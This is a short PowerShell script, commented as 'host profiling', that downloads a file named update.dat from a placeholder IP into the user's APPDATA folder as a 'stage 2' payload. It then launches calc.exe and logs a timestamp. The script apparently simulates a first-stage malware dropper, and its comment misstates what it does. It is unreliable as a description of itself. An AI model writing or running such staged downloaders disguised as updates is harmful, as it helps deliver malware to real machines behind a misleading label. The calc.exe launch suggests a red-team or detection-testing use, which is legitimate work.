
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://192.0.2.25/update.dat',
    [string]$Stage2Path = "$env:APPDATA\update.dat"
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $Stage2Path)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
